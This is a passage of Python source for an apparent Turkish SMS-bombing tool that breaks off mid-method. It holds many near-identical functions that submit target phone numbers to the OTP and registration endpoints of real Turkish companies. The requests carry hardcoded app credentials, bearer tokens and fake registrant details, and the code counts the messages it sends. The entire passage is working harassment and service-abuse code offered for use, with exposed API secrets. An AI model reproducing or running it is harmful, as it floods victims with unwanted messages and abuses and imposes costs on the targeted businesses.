                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #watsons.com.tr
    def Watsons(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
                    json={"countryCode": "TR", "phoneNumber": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #buyursungelsin.com
    def Buyur(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://app.buyursungelsin.com:443/api/customer/form/check"
                    headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
                    data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{numara}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #idealdata.com.tr
    def Osmanlideal(self):


        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #pinarsu.com.tr
    def Pinar(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
                    headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
                    json={"MobilePhone": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.text == "true":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pinarsumobileservice.yasar.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pinarsumobileservice.yasar.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #suiste.com
    def Suiste(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://suiste.com:443/api/auth/code"
                    headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
                    data = {"action": "register", "gsm": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["code"] == "common.success":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suiste.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #hayatsu.com.tr
    def Hayat(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
                    json={"mobilePhoneNumber": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["IsSuccessful"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hayatsu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #pisir.com
    def Pisir(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": numara})
                    if r.json()["ok"] == "1":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.pisir.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.pisir.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
                
    
    #KimGbIster
    def KimGb(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{numara}"})
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #ikinciyeni.com
    def IkinciYeni(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
                    json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["isSucceed"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #terrapizza.com.tr
    def Terra(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.terrapizza.com.tr:443/api/v1/customers"
                    json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(numara), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
                    r = requests.post(url,  json=json)
                    if (r.status_code) == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.terrapizza.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.terrapizza.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

            
            
    #ipragaz.com.tr
    def IpraGaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
                    json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(numara), "playerId": ""}
                    r = requests.post(url, json=json)
                    if (r.json()["phoneNumber"]) == str(numara):
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
                    json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": numara, "productType": 1, "subscription": True, "surname": "Bas"}
                    r = requests.post(url, json=json)
                    if (r.json()["messageCode"]) == "OK":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue  
            
    #ipragaz.com.tr
    def GoMobile(self):
    
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={numara}&isRegistered=true")
                    if (r.json()["data"]["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gomobilapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gomobilapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
                    json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{numara}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #totalistasyonlari.com.tr
    def Total(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={numara}&api_key=GetDocuments%0A", verify=False)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.totalistasyonlari.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.totalistasyonlari.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue            
            
    #opet.com.tr
    def Opet(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.opet.com.tr:443/api/authentication/register"
                    json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(numara), "opetKvkkAndEtk": True, "plate": "31ABC31"}
                    r = requests.post(url, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.opet.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.opet.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #dolap.com
    def Dolap(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api-gateway.dolap.com:443/member"
                    headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
                    json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": numara}
                    r = requests.put(url, headers=headers, json=json)
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api-gateway.dolap.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api-gateway.dolap.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #heymobility.tech
    def Hey(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}", headers=headers)
                    if (r.json()["IsSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> heyapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> heyapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #tazi.tech
    def Tazi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
                    json={"cep_tel": numara, "cep_tel_ulkekod": "90"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["kod"]) == "0000":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #isbike.istanbul
    def Isbike(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "http://app.isbike.istanbul:80/api/uye/otpsms"
                    headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
                    json={"cep_tel": numara, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.isbike.istanbul "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.isbike.istanbul "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #n11.com
    def N11(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
                    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
                    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["isSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #joker.com.tr
    def Joker(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
                    data = {"phone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> joker.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> joker.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #e-bebek.com
    def Ebebek(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
                    auth = (r.json()["access_token"])
